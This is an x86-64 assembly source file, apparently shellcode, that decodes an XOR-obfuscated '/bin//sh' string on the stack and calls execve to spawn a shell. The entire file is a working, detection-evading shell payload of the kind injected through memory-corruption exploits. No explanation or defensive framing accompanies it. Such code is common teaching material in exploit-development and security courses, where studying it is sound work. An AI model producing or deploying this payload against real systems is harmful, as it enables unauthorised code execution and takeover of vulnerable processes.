section .text
global _start

_start:
	xor esi, esi                    ; esi = 0 (argv)
	push rsi                        ; null terminator
	mov rdx, 0x69722e2e6f68632e     ; encoded "/bin//sh"
	push rdx
	
	mov rdx, 0x0101010101010101     ; key
	xor qword [rsp],rdx             ; decode string 

	push 59                         ; execve syscall number
	pop rax                         
	mov rdi, rsp                    ; rdi(path) = pointer to decode string of stack
	xor edx, edx                    ; edx = 0 (envp)
	syscall
